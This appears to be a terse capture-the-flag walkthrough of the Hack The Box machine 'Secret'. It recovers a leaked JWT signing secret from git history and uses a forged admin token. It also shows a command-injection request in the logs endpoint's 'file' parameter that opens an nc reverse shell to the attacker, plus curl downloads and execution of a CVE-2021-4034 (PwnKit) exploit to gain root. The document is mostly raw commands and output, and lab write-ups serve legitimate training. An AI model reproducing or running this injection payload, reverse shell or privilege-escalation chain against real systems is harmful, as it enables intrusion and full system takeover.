#Enumeration
Use dirb to get the directory 10.10.11.120:3000/files.zip
# Checking the .git history
```
0000000000000000000000000000000000000000 55fe756a29268f9b4e786ae468952ca4a8df1bd8 dasithsv <dasithsv@gmail.com> 1630648552 +0530        commit (initial): first commit
55fe756a29268f9b4e786ae468952ca4a8df1bd8 3a367e735ee76569664bf7754eaaade7c735d702 dasithsv <dasithsv@gmail.com> 1630648599 +0530        commit: added downloads
3a367e735ee76569664bf7754eaaade7c735d702 4e5547295cfe456d8ca7005cb823e1101fd1f9cb dasithsv <dasithsv@gmail.com> 1630648655 +0530        commit: removed swap
4e5547295cfe456d8ca7005cb823e1101fd1f9cb de0a46b5107a2f4d26e348303e76d85ae4870934 dasithsv <dasithsv@gmail.com> 1630648759 +0530        commit: added /downloads
de0a46b5107a2f4d26e348303e76d85ae4870934 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 dasithsv <dasithsv@gmail.com> 1630648817 +0530        commit: removed .env for security reasons
67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 e297a2797a5f62b6011654cf6fb6ccb6712d2d5b dasithsv <dasithsv@gmail.com> 1631126007 +0530        commit: now we can view logs from server 😃

```

```
┌──(kali㉿kali)-[~/Documents/HTB/secret/local-web]
└─$ git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret

```
```html

GET /api/logs/?file=0;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.231 6969 >/tmp/f HTTP/1.1

Host: 10.10.11.120:3000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0

Content-Type:application/json

Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjA1ODk0OTAxMjkxYzA0NjRkZmRmMTYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6IlRHQ0Bub3doZXJlLmNvbSIsImlhdCI6MTY0NDUzMDA3MH0.9mP1WrnMqAlNANivAR19Cn6vNTaPF_MBgTvOSYd9zow

Content-Length: 6



{



}
```

Transfer linpeas

```results
╔══════════╣ Operative system                                                                                                                                                                                     
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                                                                     
Linux version 5.4.0-89-generic (buildd@lgw01-amd64-044) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021                                                           
Distributor ID: Ubuntu                                                                                                                                                                                            
Description:    Ubuntu 20.04.3 LTS                                                                                                                                                                                
Release:        20.04                                                                                                                                                                                             
Codename:       focal                                                                                                                                                                                             
                                                                                                                                                                                                                  
╔══════════╣ Sudo version                                                                                                                                                                                         
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                                                                        
Sudo version 1.8.31                                                                                                                                                                                               
                                                                                                                                                                                                                  
Vulnerable to CVE-2021-4034                                                                                                                                                                                       
                                                                                                                                                                                                                  
./linpeas.sh: 1188: [[: not found                                                                                                                                                                                 
./linpeas.sh: 1188: rpm: not found                                                                                                                                                                                
./linpeas.sh: 1188: 0: not found                                                                                                                                                                                  
                                                                                                                                                                                                                  
╔══════════╣ PATH                                                                                                                                                                                                 
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                                                                
/usr/bin:/bin                                                                                                                                                                                                     
New path exported: /usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin                                                                                                                                   
                                                                               

```d
https://github.com/berdav/CVE-2021-4034
https://www.exploit-db.com/exploits/50689

```rootflag
$ curl http://10.10.14.231:8000/evil-so-.c -o evil-so.c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   172  100   172    0     0    873      0 --:--:-- --:--:-- --:--:--   868
$ curl http://10.10.14.231:8000/exploit.c -o exploit.c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   555  100   555    0     0   2720      0 --:--:-- --:--:-- --:--:--  2733
$ make
gcc -shared -o evil.so -fPIC evil-so.c
evil-so.c: In function ‘gconv_init’:
evil-so.c:10:2: warning: implicit declaration of function ‘setgroups’; did you mean ‘getgroups’? [-Wimplicit-function-declaration]
   10 |  setgroups(0);
      |  ^~~~~~~~~
      |  getgroups
evil-so.c:12:2: warning: null argument where non-null required (argument 2) [-Wnonnull]
   12 |  execve("/bin/sh", NULL, NULL);
      |  ^~~~~~
gcc exploit.c -o exploit
exploit.c: In function ‘main’:
exploit.c:26:2: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
   26 |  execve(BIN, argv, envp);
      |  ^~~~~~
$ ls
asdf
evil.so
evil-so.c
exploit
exploit.c
linpeas.sh
makefile
multipath
rash
$ ./exploit
whoami
root
pwd
/dev/shm
cd /root
ls
root.txt
```
